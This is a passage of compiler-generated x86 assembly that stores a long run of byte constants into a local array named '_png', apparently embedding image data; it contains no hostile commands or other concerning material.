	mov	BYTE PTR _png$[ebp+1394], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1395], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+1396], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1397], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+1398], 88		; 00000058H
	mov	BYTE PTR _png$[ebp+1399], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+1400], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1401], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+1402], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+1403], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1404], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+1405], -31		; ffffffe1H
	mov	BYTE PTR _png$[ebp+1406], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1407], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+1408], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1409], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+1410], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+1411], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+1412], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+1413], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+1414], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+1415], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1416], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+1417], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+1418], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+1419], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+1420], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+1421], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+1422], 3
	mov	BYTE PTR _png$[ebp+1423], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+1424], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+1425], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+1426], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+1427], 121		; 00000079H
	mov	BYTE PTR _png$[ebp+1428], -122		; ffffff86H
	mov	BYTE PTR _png$[ebp+1429], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+1430], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1431], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+1432], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+1433], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+1434], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+1435], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+1436], -6		; fffffffaH
	mov	BYTE PTR _png$[ebp+1437], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1438], 56		; 00000038H
	mov	BYTE PTR _png$[ebp+1439], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+1440], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+1441], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+1442], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1443], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+1444], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+1445], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+1446], 88		; 00000058H
	mov	BYTE PTR _png$[ebp+1447], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+1448], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+1449], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+1450], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+1451], 56		; 00000038H
	mov	BYTE PTR _png$[ebp+1452], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+1453], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+1454], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1455], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+1456], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+1457], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+1458], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+1459], -77		; ffffffb3H
	mov	BYTE PTR _png$[ebp+1460], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+1461], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+1462], -120		; ffffff88H
	mov	BYTE PTR _png$[ebp+1463], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1464], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+1465], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1466], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+1467], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+1468], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+1469], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+1470], 56		; 00000038H
	mov	BYTE PTR _png$[ebp+1471], 2
	mov	BYTE PTR _png$[ebp+1472], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+1473], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+1474], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+1475], 9
	mov	BYTE PTR _png$[ebp+1476], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+1477], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+1478], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+1479], -31		; ffffffe1H
	mov	BYTE PTR _png$[ebp+1480], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+1481], -13		; fffffff3H
	mov	BYTE PTR _png$[ebp+1482], 3
	mov	BYTE PTR _png$[ebp+1483], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+1484], 98		; 00000062H
	mov	BYTE PTR _png$[ebp+1485], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+1486], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+1487], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+1488], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+1489], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+1490], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+1491], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+1492], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1493], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+1494], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+1495], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1496], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1497], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+1498], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+1499], 124		; 0000007cH
	mov	BYTE PTR _png$[ebp+1500], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1501], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+1502], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+1503], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+1504], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+1505], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1506], 8
	mov	BYTE PTR _png$[ebp+1507], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+1508], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+1509], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1510], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+1511], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+1512], -48		; ffffffd0H
	mov	BYTE PTR _png$[ebp+1513], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1514], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+1515], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+1516], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1517], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+1518], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+1519], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+1520], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1521], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+1522], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1523], -6		; fffffffaH
	mov	BYTE PTR _png$[ebp+1524], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1525], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1526], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+1527], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1528], 5
	mov	BYTE PTR _png$[ebp+1529], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+1530], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+1531], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1532], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+1533], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+1534], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+1535], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+1536], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+1537], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+1538], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+1539], -122		; ffffff86H
	mov	BYTE PTR _png$[ebp+1540], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+1541], -32		; ffffffe0H
	mov	BYTE PTR _png$[ebp+1542], -48		; ffffffd0H
	mov	BYTE PTR _png$[ebp+1543], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+1544], -80		; ffffffb0H
	mov	BYTE PTR _png$[ebp+1545], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+1546], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1547], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1548], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+1549], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+1550], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+1551], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+1552], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1553], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+1554], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+1555], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1556], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+1557], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1558], -68		; ffffffbcH
	mov	BYTE PTR _png$[ebp+1559], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+1560], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+1561], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+1562], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+1563], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+1564], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+1565], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1566], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+1567], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+1568], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1569], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+1570], -60		; ffffffc4H
	mov	BYTE PTR _png$[ebp+1571], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1572], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1573], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1574], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+1575], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+1576], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1577], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1578], -27		; ffffffe5H
	mov	BYTE PTR _png$[ebp+1579], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+1580], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1581], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1582], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+1583], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1584], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+1585], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1586], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1587], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1588], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+1589], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+1590], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+1591], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+1592], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+1593], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+1594], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+1595], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+1596], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+1597], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+1598], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+1599], 46		; 0000002eH
	mov	BYTE PTR _png$[ebp+1600], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+1601], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1602], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1603], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+1604], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1605], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+1606], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+1607], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+1608], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1609], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1610], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+1611], -125		; ffffff83H
	mov	BYTE PTR _png$[ebp+1612], 88		; 00000058H
	mov	BYTE PTR _png$[ebp+1613], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+1614], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+1615], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1616], -43		; ffffffd5H
	mov	BYTE PTR _png$[ebp+1617], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+1618], 0
	mov	BYTE PTR _png$[ebp+1619], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+1620], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+1621], 5
	mov	BYTE PTR _png$[ebp+1622], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+1623], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1624], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1625], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+1626], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+1627], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+1628], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+1629], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+1630], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1631], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+1632], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+1633], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1634], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1635], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+1636], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+1637], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+1638], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+1639], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+1640], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+1641], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+1642], 108		; 0000006cH
	mov	BYTE PTR _png$[ebp+1643], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1644], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+1645], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+1646], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1647], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+1648], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+1649], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1650], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1651], 88		; 00000058H
	mov	BYTE PTR _png$[ebp+1652], 69		; 00000045H
	mov	BYTE PTR _png$[ebp+1653], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+1654], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1655], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+1656], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+1657], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+1658], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1659], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+1660], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1661], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1662], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1663], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+1664], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+1665], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1666], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1667], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+1668], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+1669], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1670], 46		; 0000002eH
	mov	BYTE PTR _png$[ebp+1671], 86		; 00000056H
	mov	BYTE PTR _png$[ebp+1672], -32		; ffffffe0H
	mov	BYTE PTR _png$[ebp+1673], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+1674], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+1675], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+1676], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1677], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+1678], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+1679], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+1680], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+1681], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+1682], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1683], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+1684], -80		; ffffffb0H
	mov	BYTE PTR _png$[ebp+1685], 8
	mov	BYTE PTR _png$[ebp+1686], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+1687], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1688], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+1689], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+1690], -77		; ffffffb3H
	mov	BYTE PTR _png$[ebp+1691], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+1692], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1693], 59		; 0000003bH
	mov	BYTE PTR _png$[ebp+1694], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1695], 87		; 00000057H
	mov	BYTE PTR _png$[ebp+1696], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+1697], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+1698], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+1699], -120		; ffffff88H
	mov	BYTE PTR _png$[ebp+1700], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+1701], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1702], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+1703], 28		; 0000001cH
	mov	BYTE PTR _png$[ebp+1704], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1705], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+1706], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1707], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+1708], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1709], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+1710], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+1711], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+1712], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1713], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1714], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1715], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1716], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1717], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+1718], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1719], 7
	mov	BYTE PTR _png$[ebp+1720], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+1721], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+1722], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+1723], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+1724], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+1725], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1726], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+1727], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+1728], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+1729], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+1730], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+1731], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+1732], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+1733], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1734], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+1735], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+1736], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+1737], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1738], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+1739], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1740], 81		; 00000051H
	mov	BYTE PTR _png$[ebp+1741], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+1742], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1743], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+1744], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1745], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1746], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1747], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+1748], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1749], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+1750], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+1751], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+1752], 33		; 00000021H
	mov	BYTE PTR _png$[ebp+1753], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+1754], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+1755], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1756], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+1757], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+1758], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+1759], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+1760], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+1761], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+1762], -59		; ffffffc5H
	mov	BYTE PTR _png$[ebp+1763], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+1764], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+1765], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1766], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1767], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1768], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+1769], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+1770], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+1771], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+1772], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+1773], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1774], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1775], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+1776], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+1777], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1778], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1779], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1780], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1781], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+1782], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+1783], 56		; 00000038H
	mov	BYTE PTR _png$[ebp+1784], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+1785], -12		; fffffff4H
	mov	BYTE PTR _png$[ebp+1786], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+1787], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+1788], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+1789], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+1790], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1791], 7
	mov	BYTE PTR _png$[ebp+1792], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1793], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+1794], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1795], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+1796], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1797], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+1798], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1799], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+1800], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+1801], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1802], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+1803], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+1804], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+1805], -27		; ffffffe5H
	mov	BYTE PTR _png$[ebp+1806], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+1807], -14		; fffffff2H
	mov	BYTE PTR _png$[ebp+1808], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1809], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1810], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1811], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+1812], -6		; fffffffaH
	mov	BYTE PTR _png$[ebp+1813], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1814], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+1815], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1816], 108		; 0000006cH
	mov	BYTE PTR _png$[ebp+1817], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1818], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+1819], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+1820], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+1821], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1822], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+1823], -11		; fffffff5H
	mov	BYTE PTR _png$[ebp+1824], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+1825], 13		; 0000000dH
	mov	BYTE PTR _png$[ebp+1826], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1827], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+1828], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1829], 86		; 00000056H
	mov	BYTE PTR _png$[ebp+1830], 6
	mov	BYTE PTR _png$[ebp+1831], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+1832], 81		; 00000051H
	mov	BYTE PTR _png$[ebp+1833], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+1834], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+1835], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1836], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+1837], -125		; ffffff83H
	mov	BYTE PTR _png$[ebp+1838], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+1839], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+1840], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+1841], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1842], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+1843], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+1844], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+1845], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+1846], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+1847], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+1848], -81		; ffffffafH
	mov	BYTE PTR _png$[ebp+1849], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+1850], 18		; 00000012H
